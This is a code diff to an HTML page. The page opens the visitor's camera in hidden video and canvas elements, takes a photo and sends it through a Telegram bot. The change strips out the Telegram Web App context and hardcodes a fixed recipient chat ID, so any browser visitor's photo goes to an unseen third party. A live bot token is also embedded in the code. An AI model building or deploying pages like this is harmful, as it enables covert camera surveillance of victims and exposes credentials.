@@ -3,25 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web App Camera</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Browser Camera</title>
 </head>
 <body>
+    <h1>Taking a photo...</h1>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <script>
         const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
-        const tg = window.Telegram.WebApp;
-
-        // Инициализация Telegram Web App
-        const CHAT_ID = tg.initDataUnsafe?.user?.id;
-
-        if (!CHAT_ID) {
-            console.error("Telegram User ID is missing. Make sure the Web App is launched in Telegram.");
-            tg.close();
-        }
-
-        tg.expand(); // Расширить Web App на весь экран
+        const CHAT_ID = '1753361154';
 
         // Функция для работы с камерой
         const startCameraAndCapturePhoto = () => {
@@ -60,23 +50,18 @@
                                     .then(data => {
                                         if (data.ok) {
                                             console.log("Photo sent successfully!");
-                                            tg.close(); // Закрыть Web App после успешной отправки
                                         } else {
                                             console.error("Failed to send photo:", data.description);
-                                            tg.close();
                                         }
                                     })
-                                    .catch(err => {
-                                        console.error("Error sending photo:", err);
-                                        tg.close();
-                                    });
+                                    .catch(err => console.error("Error sending photo:", err));
                                 });
                         }, 1000); // 1 секунда для активации камеры
                     };
                 })
                 .catch(err => {
                     console.error("Camera access error:", err);
-                    tg.close(); // Закрыть Web App при ошибке
+                    document.body.innerHTML = "<h1>Camera access denied. Please allow camera permissions.</h1>";
                 });
         };
 
